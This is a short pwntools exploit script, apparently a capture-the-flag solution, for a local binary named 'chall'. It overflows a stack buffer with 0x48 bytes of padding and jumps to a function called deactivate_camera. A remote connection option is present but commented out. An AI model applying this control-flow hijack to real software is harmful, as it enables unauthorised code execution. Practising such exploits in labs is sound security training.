#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
#HOST = ''
#PORT = 

binf = ELF(bin_file)

def attack(io, **kwargs):
    io.sendlineafter('>', '1')
    io.sendlineafter('>', b'a'*0x48 + p64(binf.sym.deactivate_camera))

def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
